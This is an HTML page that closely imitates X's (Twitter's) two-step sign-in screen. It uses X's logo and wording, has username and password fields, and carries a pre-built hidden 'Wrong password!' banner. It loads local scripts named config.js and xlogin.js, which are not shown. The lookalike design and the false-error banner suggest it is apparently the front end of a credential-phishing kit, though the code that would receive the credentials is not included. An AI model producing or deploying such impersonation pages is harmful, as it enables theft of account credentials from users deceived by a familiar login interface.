<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>X Authentication Flow</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white min-h-screen flex items-center justify-center font-sans">

  <main class="w-full max-w-sm sm:max-w-md min-h-screen sm:min-h-0 sm:h-auto flex flex-col justify-between sm:justify-center p-4 sm:p-6">

    <div id="step-1" class="w-full flex flex-col justify-between flex-1 sm:flex-initial space-y-6">
      <div class="w-full flex items-center justify-start">
        <button type="button" class="w-9 h-9 rounded-full bg-stone-900/80 flex items-center justify-center hover:bg-stone-800 transition">
          <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
          </svg>
        </button>
      </div>

      <div class="w-full space-y-6 my-auto sm:my-0">
        <div class="flex items-center space-x-3 justify-center sm:justify-start">
          <svg class="w-7 h-7 sm:w-8 sm:h-8 fill-current text-white shrink-0" viewBox="0 0 24 24">
            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
          </svg>
          <h1 class="text-xl sm:text-2xl font-bold tracking-wide">See what's happening</h1>
        </div>

        <div class="w-full">
          <div class="relative rounded-md border border-sky-500 bg-black p-2.5 sm:p-3 focus-within:ring-1 focus-within:ring-sky-500">
            <label class="block text-xs text-sky-400 font-medium">Email or username</label>
            <input 
              id="identity-input" 
              type="text" 
              placeholder="e.g. davido"
              class="w-full bg-transparent text-white focus:outline-none text-sm sm:text-base" 
            />
          </div>
        </div>

        <button 
          id="step1-continue-btn"
          disabled
          class="w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-zinc-800 text-zinc-500 cursor-not-allowed"
        >
          Continue
        </button>
      </div>

      <p class="text-[11px] sm:text-xs text-zinc-500 text-center leading-relaxed px-2 pt-4">
        By continuing, you agree to our <a href="#" class="text-white hover:underline">Terms of Service</a>, <a href="#" class="text-white hover:underline">Privacy Policy</a> and <a href="#" class="text-white hover:underline">Cookie Use</a>.
      </p>
    </div>

    <div id="step-2" class="w-full flex flex-col justify-between flex-1 sm:flex-initial space-y-6 hidden">
      <div class="w-full flex items-center justify-start">
        <button id="back-to-step1-btn" type="button" class="w-9 h-9 rounded-full bg-stone-900/80 flex items-center justify-center hover:bg-stone-800 transition">
          <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
          </svg>
        </button>
      </div>

      <div class="w-full space-y-6 my-auto sm:my-0">
        <div class="flex justify-center">
          <svg class="w-10 h-10 sm:w-12 sm:h-12 fill-current text-white" viewBox="0 0 24 24">
            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
          </svg>
        </div>

        <div class="w-full text-left">
          <h1 class="text-2xl sm:text-3xl font-bold tracking-tight">Log in</h1>
        </div>

        <div id="error-banner" class="w-full bg-red-500/10 border border-red-500 text-red-500 text-xs sm:text-sm p-3 rounded-md text-center font-medium hidden">
          Wrong password!
        </div>

        <div class="w-full space-y-4">
          <div class="rounded-md border border-zinc-800 bg-black p-2.5 sm:p-3">
            <label class="block text-xs text-zinc-500">Username</label>
            <input 
              id="display-username" 
              type="text" 
              readonly 
              class="w-full bg-transparent text-white focus:outline-none text-base sm:text-lg tracking-wide cursor-not-allowed" 
            />
          </div>

          <div id="password-container" class="relative rounded-md border border-sky-500 bg-black p-2.5 sm:p-3 flex items-center justify-between">
            <div class="w-full">
              <label id="password-label" class="block text-xs text-sky-400 font-medium">Password</label>
              <input 
                id="password-input" 
                type="password" 
                class="w-full bg-transparent text-white focus:outline-none text-base sm:text-lg" 
              />
            </div>
            <button id="toggle-password-btn" type="button" class="text-zinc-400 hover:text-white pl-2 shrink-0">
              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
              </svg>
            </button>
          </div>
        </div>

        <div class="w-full text-center">
          <a href="#" class="text-white font-bold text-xs sm:text-sm hover:underline">Forgot password?</a>
        </div>

        <button 
          id="login-btn"
          disabled
          class="w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-zinc-800 text-zinc-500 cursor-not-allowed flex items-center justify-center space-x-2"
        >
          <span id="btn-text">Log in</span>
        </button>
      </div>

      <p class="text-[11px] sm:text-xs text-zinc-500 text-center leading-relaxed px-2 pt-4">
        By continuing, you agree to our <a href="#" class="text-white hover:underline">Terms of Service</a>, <a href="#" class="text-white hover:underline">Privacy Policy</a> and <a href="#" class="text-white hover:underline">Cookie Use</a>.
      </p>
    </div>

  </main>

    <script src="js/config.js"></script>
  <script src="js/xlogin.js"></script>
</body>
</html>
